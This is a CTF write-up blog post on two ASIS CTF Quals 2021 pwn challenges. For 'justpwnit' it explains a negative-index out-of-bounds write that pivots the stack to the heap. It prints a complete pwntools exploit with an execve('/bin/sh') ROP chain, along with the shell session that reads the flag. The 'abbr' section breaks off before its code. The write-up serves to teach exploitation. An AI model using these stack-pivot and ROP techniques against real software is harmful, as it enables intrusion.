<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.You can find the related files here. justpwnitjustpwnit was a warmup pwn challenge. That’s only a basic stack overflow">
<meta property="og:type" content="article">
<meta property="og:title" content="[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit">
<meta property="og:url" content="https://n4sm.github.io/posts/pwnasis/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.You can find the related files here. justpwnitjustpwnit was a warmup pwn challenge. That’s only a basic stack overflow">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-10-24T00:00:00.000Z">
<meta property="article:modified_time" content="2023-09-05T09:45:11.052Z">
<meta property="article:author" content="nasm">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="nasm">
<meta property="article:tag" content="2021">
<meta property="article:tag" content="ret2school">
<meta property="article:tag" content="heap">
<meta property="article:tag" content="ASIS CTF">
<meta property="article:tag" content="oob write">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/pic/wall.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>repr </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/pic/chtholly.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nasm </div>
      <div class="dot"></div>
      <div class="subtitle">pwn / kernel stuff </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/pwn/">
                pwn
                <div class="category-count">19</div>
            </a>
        
            <a class="category-link" href="/categories/kernel/">
                kernel
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/research/">
                research
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/posts/vbox_fuzzing/" title="Let's fuzz the VBox USB stack" >
            <div class="recent-link-text">
              Let&#39;s fuzz the VBox USB stack
            </div>
          </a>
        
          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] window-of-opportunity
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-pwnasis" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2021-10-24T00:00:00.000Z" itemprop="datePublished">2021-10-24</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            2.7k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2021/" rel="tag">2021</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASIS-CTF/" rel="tag">ASIS CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/oob-write/" rel="tag">oob write</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2school/" rel="tag">ret2school</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.<br>You can find the related files <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/blob/master/2021/asisctf">here</a>.</p>
<h1 id="justpwnit"><a href="#justpwnit" class="headerlink" title="justpwnit"></a>justpwnit</h1><p>justpwnit was a warmup pwn challenge. That’s only a basic stack overflow.<br>The binary is statically linked and here is the checksec’s output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/nasm/justpwnit&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Morever the source code is provided as it is the case for all the pwn tasks !<br>Here it is:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_SIZE 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_element</span><span class="params">(<span class="type">char</span> **parray)</span> &#123;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;index) != <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (!(parray[index] = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>), STR_SIZE)))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!fgets(parray[index], STR_SIZE, <span class="built_in">stdin</span>))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">justpwnit</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *<span class="built_in">array</span>[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    set_element(<span class="built_in">array</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">  justpwnit();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.<br>Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
<p>Let’s see this in gdb !</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         </span><br><span class="line">01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      </span><br><span class="line">02:0010│         0x7ffef03864f0 ◂— 0x0</span><br><span class="line">03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* &#x27;?=@&#x27; */</span><br><span class="line">04:0020│         0x7ffef0386500 ◂— 0x0</span><br><span class="line">05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 </span><br><span class="line">06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1</span><br><span class="line">07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1</span><br><span class="line">08:0040│ rax     0x7ffef0386520 ◂— 0xb4</span><br><span class="line">09:0048│         0x7ffef0386528 ◂— 0x0</span><br><span class="line">... ↓            4 skipped</span><br><span class="line">0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1</span><br><span class="line">0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0</span><br></pre></td></tr></table></figure>

<p>That’s the stack’s state when we are calling calloc. We can see the <code>set_element</code>‘s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
<p>Then, if we do so, the stack’s state looks like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         </span><br><span class="line">01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      </span><br><span class="line">02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         </span><br><span class="line">03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* &#x27;?=@&#x27; */                                                                                                                              </span><br><span class="line">04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         </span><br><span class="line">05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  </span><br><span class="line">06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       </span><br><span class="line">07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    </span><br><span class="line">08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        </span><br><span class="line">09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         </span><br><span class="line">... ↓            4 skipped                                                                                                                                                                     </span><br><span class="line">0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       </span><br><span class="line">0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         </span><br></pre></td></tr></table></figure>

<p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
<h2 id="ROPchain"><a href="#ROPchain" class="headerlink" title="ROPchain"></a>ROPchain</h2><p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.<br>The binary is statically linked, and there is no system function in the binary, so we can’t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
<p>And so what we need is:</p>
<ul>
<li>pop rdi gadget</li>
<li>pop rsi gadget</li>
<li>pop rdx gadget</li>
<li>pop rax gadget</li>
<li>syscall gadget</li>
<li>mov qword ptr [reg], reg [to write “&#x2F;bin&#x2F;sh\0”] in a writable area</li>
</ul>
<p>We can easily find these gadgets with the help <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>.<br>We got:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span><br><span class="line">0x0000000000401001 : pop rax ; ret</span><br><span class="line">0x00000000004019a3 : pop rsi ; ret</span><br><span class="line">0x00000000004013e9 : syscall</span><br><span class="line">0x0000000000403d23 : pop rdx ; ret</span><br><span class="line">0x0000000000401b0d : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>Now we just have to craft the ropchain !</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POP_RDI = <span class="number">0x0000000000401b0d</span></span><br><span class="line">POP_RDX = <span class="number">0x0000000000403d23</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004013e9</span></span><br><span class="line">POP_RAX = <span class="number">0x0000000000401001</span></span><br><span class="line">POP_RSI = <span class="number">0x00000000004019a3</span></span><br><span class="line"></span><br><span class="line">MOV_RSI_PTR_RAX = <span class="number">0x0000000000406c32</span></span><br><span class="line">PT_LOAD_W = <span class="number">0x00000000040c240</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(<span class="number">0</span>) + pwn.p64(POP_RSI) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(MOV_RSI_PTR_RAX)</span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(POP_RSI) + pwn.p64(<span class="number">0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX) + pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br></pre></td></tr></table></figure>

<p>And we can enjoy the shell !</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010</span><br><span class="line">[*] &#x27;/home/nasm/pwn/asis2021/justpwnit/justpwnit&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to 168.119.108.148 on port 11010: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=999(pwn) gid=999(pwn) groups=999(pwn)</span><br><span class="line">$ ls</span><br><span class="line">chall</span><br><span class="line">flag-69a1f60d8055c88ea27fed1ab926b2b6.txt</span><br><span class="line">$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt</span><br><span class="line">ASIS&#123;p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Full-exploit"><a href="#Full-exploit" class="headerlink" title="Full exploit"></a>Full exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe  = pwn.context.binary = pwn.ELF(<span class="string">&#x27;justpwnit&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST</span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">set follow-fork-mode parent</span></span><br><span class="line"><span class="string">b* main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="string">b&quot;-2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004019a3 : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004013e9 : syscall</span></span><br><span class="line"><span class="comment"># 0x0000000000403d23 : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401b0d : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">POP_RDI = <span class="number">0x0000000000401b0d</span></span><br><span class="line">POP_RDX = <span class="number">0x0000000000403d23</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004013e9</span></span><br><span class="line">POP_RAX = <span class="number">0x0000000000401001</span></span><br><span class="line">POP_RSI = <span class="number">0x00000000004019a3</span></span><br><span class="line"></span><br><span class="line">MOV_RSI_PTR_RAX = <span class="number">0x0000000000406c32</span></span><br><span class="line"></span><br><span class="line">PT_LOAD_W = <span class="number">0x00000000040c240</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(<span class="number">0</span>) + pwn.p64(POP_RSI) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(MOV_RSI_PTR_RAX)</span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(POP_RSI) + pwn.p64(<span class="number">0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX) + pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Data: &quot;</span>, pld)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="abbr"><a href="#abbr" class="headerlink" title="abbr"></a>abbr</h1><p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
<p>Here is the source code:</p>
